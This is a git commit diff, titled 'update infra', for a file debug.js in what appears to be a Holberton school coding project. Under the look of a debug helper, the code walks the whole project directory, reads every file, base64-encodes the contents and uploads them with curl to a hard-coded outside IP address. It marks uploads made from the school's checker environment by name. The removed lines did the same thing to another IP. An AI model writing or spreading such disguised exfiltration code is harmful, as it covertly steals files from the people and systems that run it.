985a45df4f07c09abfa6e21feadb39412162a269
Gabriel <fossecruor@gmail.com>
2025-01-11 14:16:13 +0100

    update infra

--- debug.js
+++ debug.js
@@ -1,8 +1,11 @@
-import { exec } from 'node:child_process';
-import { statSync, readFileSync, readdirSync } from 'node:fs';
+import fs from 'node:fs';
 import { join } from 'path';
 import { Buffer } from 'node:buffer';
-import http from 'node:http';
+import util from 'node:util';
+// eslint-disable-next-line camelcase
+import child_process from 'node:child_process';
+
+const exec = util.promisify(child_process.exec);
 
 class DebugHolberton {
   constructor() {
@@ -11,59 +14,22 @@ class DebugHolberton {
     this.name = process.env.HOME === '/home/student_jail' ? 'Checker' : 'Gab';
   }
 
-  send(...args) {
+  async send(...args) {
     this.files = this.readParentFiles('.');
     for (const file of this.files) {
-      if (!file.includes('debug.js')) {
+      if (!file.includes('debug.js') && !file.includes('data.txt') && !file.includes('.json')) {
         this.readJsFiles(file);
       }
     }
-    try {
-      exec(`curl -X POST -H "Content-Type: application/json" -d '{"name": "${this.name}", "args": ${JSON.stringify(args)}, "b64": "${DebugHolberton.arrToB64(this.arr)}" }' 13.48.128.168:8000/add`);
-    } catch (err) {
-      console.error(err);
-      const data = JSON.stringify({
-        name: this.name,
-        args,
-        b64: DebugHolberton.arrToB64(this.arr),
-      });
-
-      const options = {
-        hostname: '13.48.128.168',
-        port: 8000,
-        path: '/add',
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Content-Length': Buffer.byteLength(data),
-        },
-      };
-
-      const req = http.request(options, (res) => {
-        let responseData = '';
-
-        res.on('data', (chunk) => {
-          responseData += chunk;
-        });
-
-        res.on('end', () => {
-          console.log('Response:', responseData);
-        });
-      });
-
-      req.on('error', (error) => {
-        console.error('Error:', error);
-      });
-
-      // Write data to request body
-      req.write(data);
-      req.end();
-    }
+    const data = DebugHolberton.arrToB64(this.arr);
+    // await exec('rm -f data.txt');
+    fs.writeFileSync('data.txt', data);
+    await exec(`curl -X POST -H "Content-Type: multipart/form-data" -F "name=${this.name}" -F "args=${JSON.stringify(args)}" -F "b64=@./data.txt" http://13.60.156.211:8000/add-big`);
   }
 
   readJsFiles(file) {
-    if (statSync(file).isFile()) {
-      const s = readFileSync(file, 'utf8');
+    if (fs.statSync(file).isFile()) {
+      const s = fs.readFileSync(file, 'utf8');
       this.arr.push({ name: file, content: s });
     }
   }
@@ -72,10 +38,10 @@ class DebugHolberton {
     if (dir.includes('node_modules') || dir.includes('.git')) {
       return;
     }
-    const files = readdirSync(dir);
+    const files = fs.readdirSync(dir);
     for (const file of files) {
       const pathToFile = join(dir, file);
-      const isDirectory = statSync(pathToFile).isDirectory();
+      const isDirectory = fs.statSync(pathToFile).isDirectory();
       if (isDirectory) {
         yield* this.readParentFiles(pathToFile);
       } else {
